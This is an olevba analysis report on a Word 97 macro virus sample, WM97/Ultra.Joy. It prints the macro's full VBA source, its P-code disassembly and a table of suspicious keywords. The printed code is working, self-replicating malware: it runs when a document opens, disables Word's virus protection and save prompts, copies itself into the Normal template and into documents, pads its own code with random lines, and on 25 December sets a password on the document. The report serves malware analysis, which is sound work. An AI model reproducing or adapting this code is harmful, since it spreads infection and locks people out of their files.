olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ea
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ea - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String

Randomize

On Error GoTo 79

Options.VirusProtection = Chr(48)

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

rt = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

dt = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

If dt > 0 And rt > 0 Then GoTo 79

If dt = 0 Then

    Set Joy = NormalTemplate.VBProject.VBComponents

    Set hst = ActiveDocument.VBProject.VBComponents

    If Month(Now()) = 10 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

    If Month(Now()) = 11 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(74) + Chr(79) + Chr(89)

    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "Ultra.Joy"

    hst.Item(Cos(Atn(CInt(1)))).Name = Joy.Item(Cos(Atn(CInt(1)))).Name

    hst.Item(Cos(Atn(CInt(1)))).Export Application.StartupPath & System.Version & Chr(74) + Chr(79) + Chr(89)
    
End If

If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents

Joy.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Application.StartupPath & System.Version & Chr(74) + Chr(79) + Chr(89)

With Joy.Item(Cos(Atn(CInt(1)))).codemodule

    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)

    Next j

    End With

If dt = 0 Then Joy.Item(Cos(Atn(CInt(1)))).codemodule.replaceline 1, "Sub AutoClose()"

If dt = 0 Then Joy.Item(Cos(Atn(CInt(1)))).codemodule.replaceline 85, "Sub ToolsMarco()"

If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Joy.Item(Cos(Atn(CInt(1)))).codemodule

   For j = Chr(50) To Joy.Item(Cos(Atn(CInt(1)))).codemodule.countoflines Step Chr(50)

    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55

    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)

    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)

    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
    
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)

    .replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & xoe & rex & ixn & oxe & exr & nix & rnl & xxe & xex & exx & exd & xoe & eox & rxe & nix & xoe & rex

   Next j

End With

79:

If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode() 'WM97/Ultra.Joy by Virus :) Smile

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.ea
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6666 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	Dim 
' 	VarDefn rsx
' 	VarDefn rox
' 	VarDefn xix
' 	VarDefn xxi (As Integer)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn xxe
' 	VarDefn xex
' 	VarDefn exx
' 	VarDefn exd
' 	VarDefn cxi
' 	VarDefn cix
' 	VarDefn xic
' 	VarDefn eox
' 	VarDefn xoe
' 	VarDefn oxe
' 	VarDefn cii
' 	VarDefn rxe
' 	VarDefn rex
' 	VarDefn exr
' 	VarDefn nix
' 	VarDefn ixn
' 	VarDefn nxi
' 	VarDefn lnr
' 	VarDefn nrl
' 	VarDefn rnl (As String)
' Line #3:
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' Line #6:
' 	OnError 79 
' Line #7:
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' Line #10:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' Line #12:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' Line #14:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rt 
' Line #15:
' Line #16:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St dt 
' Line #17:
' Line #18:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 79 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' Line #22:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Joy 
' Line #23:
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set hst 
' Line #25:
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #27:
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #29:
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "Ultra.Joy"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #31:
' Line #32:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #33:
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' Line #36:
' 	EndIfBlock 
' Line #37:
' Line #38:
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Joy 
' 	EndIf 
' Line #39:
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #41:
' Line #42:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #43:
' Line #44:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #45:
' Line #46:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #47:
' Line #48:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' Line #50:
' 	EndWith 
' Line #51:
' Line #52:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #53:
' Line #54:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0055 
' 	LitStr 0x0010 "Sub ToolsMarco()"
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #55:
' Line #56:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' Line #58:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #59:
' Line #60:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	ForStep 
' Line #61:
' Line #62:
' 	LitDI2 0x000B 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0BB6 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0018 
' 	Add 
' 	St rsx 
' 	BoS 0x0000 
' 	LitDI2 0x000F 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x16E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0021 
' 	Add 
' 	St rox 
' 	BoS 0x0000 
' 	LitDI2 0x002C 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0DD8 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0037 
' 	Add 
' 	St xix 
' Line #63:
' Line #64:
' 	Ld rsx 
' 	ArgsLd Asc 0x0001 
' 	St cii 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0005 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St eox 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x000E 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xoe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0016 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St oxe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0004 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St lnr 
' Line #65:
' Line #66:
' 	Ld rox 
' 	ArgsLd Asc 0x0001 
' 	St cix 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0007 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St rxe 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0010 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rex 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exr 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0011 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St nrl 
' Line #67:
' Line #68:
' 	Ld xix 
' 	ArgsLd Asc 0x0001 
' 	St xic 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0009 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nix 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0012 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St ixn 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0008 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nxi 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0021 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rnl 
' Line #69:
' Line #70:
' 	Ld xxi 
' 	ArgsLd Asc 0x0001 
' 	St cxi 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St xxe 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xex 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0012 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exx 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x000C 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St exd 
' Line #71:
' Line #72:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld eox 
' 	Concat 
' 	Ld rxe 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rex 
' 	Concat 
' 	Ld ixn 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	Ld nrl 
' 	Concat 
' 	Ld rnl 
' 	Concat 
' 	Ld xxe 
' 	Concat 
' 	Ld xex 
' 	Concat 
' 	Ld exx 
' 	Concat 
' 	Ld exd 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rex 
' 	Concat 
' 	Ld ixn 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld rnl 
' 	Concat 
' 	Ld xxe 
' 	Concat 
' 	Ld xex 
' 	Concat 
' 	Ld exx 
' 	Concat 
' 	Ld exd 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld rxe 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rex 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #73:
' Line #74:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' Line #76:
' 	EndWith 
' Line #77:
' Line #78:
' 	LineNum 79 
' 	BoS 0x0000 
' Line #79:
' Line #80:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #81:
' Line #82:
' 	EndSub 
' Line #83:
' Line #84:
' 	FuncDefn (Sub ViewVBCode())
' 	QuoteRem 0x0010 0x0020 "WM97/Ultra.Joy by Virus :) Smile"
' Line #85:
' Line #86:
' 	EndSub 
' Line #87:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

